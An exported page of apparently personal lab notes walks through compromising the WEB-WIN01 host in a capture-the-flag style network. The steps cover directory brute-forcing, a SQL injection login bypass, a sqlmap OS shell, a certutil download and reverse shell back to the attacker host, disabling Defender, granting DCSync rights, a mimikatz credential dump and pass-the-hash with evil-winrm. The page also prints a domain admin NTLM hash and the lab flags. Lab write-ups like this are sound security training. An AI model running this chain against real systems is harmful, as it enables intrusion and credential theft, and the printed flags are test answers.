<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WEB-WIN01 - 172.16.1.24</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WEB-WIN01 - 172.16.1.24</h1><br/><p><a href="Offshore--WEB-WIN01_-_172.16.1.24_13.html#OFS-MoveToSQL01">Diversion to SQL01 - 172.16.1.15</a></p><p><a href="Offshore--WEB-WIN01_-_172.16.1.24_13.html#OFS-Flag13">Flag 13</a></p><p><a href="Offshore--WEB-WIN01_-_172.16.1.24_13.html#OFS-domainadmincreds">corp.local domain admin credentials</a></p><p><a href="Offshore--WEB-WIN01_-_172.16.1.24_13.html#OFS-Flag14">Flag 14</a></p><p><a href="Offshore--WEB-WIN01_-_172.16.1.24_13.html#OFS-Flag15">Flag 15</a></p><p></p><p>When we check the webserver that&#39;s running the main page doesn&#39;t have anything interesting so let&#39;s gobuster it</p><p></p><p><code><span style="background-color:#000000;">└─$ gobuster dir -u 172.16.1.24 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x &quot;txt,html,php,asp,aspx,jsp&quot; -s &quot;200,204,301,302,307,403,500&quot; -k -t 16 -o &quot;gobuster_dir_10.10.110.123.txt&quot; --status-codes-blacklist &quot;&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">===============================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Gobuster v3.5</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">===============================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Url:            http://172.16.1.24</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Method:         GET</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Threads:        16</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Status codes:   307,403,500,200,204,301,302</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] User Agent:     gobuster/3.5</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Extensions:     asp,aspx,jsp,txt,html,php</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Timeout:        10s</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">===============================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023/05/01 16:27:54 Starting gobuster in directory enumeration mode</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">===============================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/About                (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/About.aspx           (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Contact              (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Contact.aspx         (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Content              (Status: 301) [Size: 150] [--&gt; http://172.16.1.24/Content/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Default              (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Default.aspx         (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Index.html           (Status: 200) [Size: 3079]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/LICENSE.txt          (Status: 200) [Size: 1096]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/Scripts              (Status: 301) [Size: 150] [--&gt; http://172.16.1.24/Scripts/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/about                (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/about.aspx           (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/aspnet_client        (Status: 301) [Size: 156] [--&gt; http://172.16.1.24/aspnet_client/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/contact.aspx         (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/contact              (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/content              (Status: 301) [Size: 150] [--&gt; http://172.16.1.24/content/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/dashboard.aspx       (Status: 301) [Size: 127] [--&gt; /dashboard]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/dashboard            (Status: 302) [Size: 123] [--&gt; /Login]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/default              (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/default.aspx         (Status: 500) [Size: 3420]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/favicon.ico          (Status: 200) [Size: 552]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/flag.txt             (Status: 200) [Size: 35]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/fonts                (Status: 301) [Size: 148] [--&gt; http://172.16.1.24/fonts/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/index.html           (Status: 200) [Size: 3079]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/index.html           (Status: 200) [Size: 3079]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/license.txt          (Status: 200) [Size: 1096]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/scripts              (Status: 301) [Size: 150] [--&gt; http://172.16.1.24/scripts/]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Progress: 32845 / 32998 (99.54%)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">===============================================================</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023/05/01 16:28:57 Finished</span></code></p><p></p><p>Flag.txt let&#39;s check that</p><p><a name="OFS-Flag13"></a><code><span style="background-color:#000000;">OFFSHORE{d0nt_l3av3_f1l3s_ar0und}</span></code></p><p></p><p>If we go to /login, we can use the svc_iis:Vintage! user that we found to authenticate and get the main login form</p><p></p><p>Let&#39;s see if this is vulnerable to SQLi</p><p></p><p><code><span style="background-color:#000000;">└─$ sqlmap -u &quot;http://172.16.1.24/login&quot; --form --dbs --level 4 --risk 3 --headers=&quot;Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==&quot; --cookie=&quot;ASP.NET_SessionId=4ttbma4z1fsg3q2s110vrgft&quot; --batch</span></code></p><p></p><p>Unfortunately this won&#39;t work because there is IPS or WAF</p><p></p><p>Let&#39;s try the more basic route -</p><p><code><span style="background-color:#000000;">&#39; or &#39;1&#39;=&#39;1&#39;-- -</span></code></p><p>in either the username or password field</p><p></p><p>This works - now let&#39;s examine what this form is doing using burpsuite when we submit a request</p><p></p><p>Check the source and then the javascript file</p><p></p><p><img src="images/13-1.png" alt="images/13-1.png" /></p><p></p><p>We can see this is a soap request - let&#39;s try SOAP XML injection with sqlmap.. maybe it will get around the IPS/WAF</p><p>To do this download and install the Burpsuite extension WSDLer</p><p></p><p>Catch the request from the form in Burp</p><p>Add ?WSDL at the end of the URL, right click and send to WSDLer (in the extensions right click menu)</p><p></p><p><img src="images/13-2.png" alt="images/13-2.png" /></p><p></p><p>It should send the request to the WSDLer tab (can be found at the top)</p><p></p><p>Open the request and copy it to a file and try to pop a shell with sqlmap</p><p></p><p><a name="OFS-MoveToSQL01"></a><code><span style="background-color:#000000;">sqlmap -r sql.req --batch --level 4 --risk 3 --dbms=mssql --dbs -p &#39;tem:author&#39; --os-shell</span></code></p><p></p><p>You might have to execute this a couple times but it should work. If it starts saying the web server responded with HTTP error code 500, you got blocked by IPS/WAF and you probably won&#39;t succeed.</p><p></p><p><img src="images/13-3.png" alt="images/13-3.png" /></p><p></p><p>Grab RCAT from your attack host to stabilize your shell</p><p></p><p><code><span style="background-color:#000000;">os-shell&gt; certutil.exe -urlcache -split -f http://10.10.16.156/rcat.exe c:\temp\rcat.exe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">do you want to retrieve the command standard output? [Y/n/a] Y</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">command standard output:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">---</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">****  Online  ****</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  000000  ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  280e83</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">CertUtil: -URLCache command completed successfully.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">---</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">os-shell&gt; c:\temp\rcat.exe connect 10.10.16.156 4444</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.156 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.156:4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Connection from 10.10.110.3:54093</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Windows PowerShell </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) 2016 Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nt service\mssql$sqlexpress</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; whoami /priv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami /priv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PRIVILEGES INFORMATION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">----------------------</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Privilege Name                Description                               State   </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">============================= ========================================= ========</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeCreateGlobalPrivilege       Create global objects                     Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></code></p><p></p><p>Here is the split point where you come back to WEB-WIN01 after setting cyber_adm&#39;s password (see SQL01)</p><p></p><p>Get the file on Administrator&#39;s desktop</p><p><a name="OFS-Flag14"></a><code><span style="background-color:#000000;">OFFSHORE{it_@ll_c0m3s_FuLl_c1rcl3}</span></code></p><p></p><p>We can see WEB-WIN01 is a member of Legacy Web Servers and this group has WriteDACL on DC01.</p><p>This means WEB-WIN01 can add DCSync permission to cyber_adm</p><p></p><p><img src="images/13-4.png" alt="images/13-4.png" /></p><p></p><p>To do this, RDP into WEB-WIN01.</p><p></p><p>Disable Defender.</p><p><code><span style="background-color:#000000;">Set-MpPreference -DisableRealtimeMonitoring $true</span></code></p><p></p><p>Get the highest privileges, nt authority\system with Psexec64.exe</p><p>Run cmd.exe administratively then run psexec64.exe -s -i cmd.exe</p><p></p><p>Turn that window into into Powershell and import PowerView.ps1</p><p></p><p><code><span style="background-color:#000000;">Add-DomainObjectAcl -TargetIdentity &quot;DC=corp,DC=local&quot; -PrincipalIdentity Cyber_Adm -Rights DCSync -Verbose</span></code></p><p></p><p><img src="images/13-5.png" alt="images/13-5.png" /></p><p></p><p>Now open another CMD administratively and do a whoami to make sure it&#39;s cyber_adm</p><p></p><p><code><span style="background-color:#000000;">C:\Windows\system32&gt;whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">corp\cyber_adm</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">C:\Windows\system32&gt;cd c:\temp</span></code></p><p></p><p>Do a DCSync dump</p><p><code><span style="background-color:#000000;">c:\temp&gt;mimikatz.exe &quot;log&quot; &quot;lsadump::dcsync /all /csv&quot; &quot;exit&quot;</span></code></p><p></p><p><table style="display:inline-table"><tr><td><a href="EmbeddedFiles/13-corp_dcsync.log">Linked file: corp_dcsync.log </a></td></tr></table></p><p></p><p>And now we have our domain admin hash</p><p><code><span style="background-color:#000000;">└─$ cat corp_dcsync.log | grep -i iamtheadministrator</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-domainadmincreds"></a>1122    iamtheadministrator     70016778cb0524c799ac25b439bd67e0        512</p><p></p><p>With this we can go back and get the missed hash on the administrator&#39;s desktop of FS01</p><p></p><p><code><span style="background-color:#000000;">└─$ evil-winrm -i 172.16.1.26 -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0</span></code></p><p></p><p><code><span style="background-color:#000000;">*Evil-WinRM* PS C:\Users\administrator\desktop&gt; type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag15"></a>OFFSHORE{f1l3_s3rv3rs_h0ld_ju1cy_d@ta}</p></div>
</body>
</html>
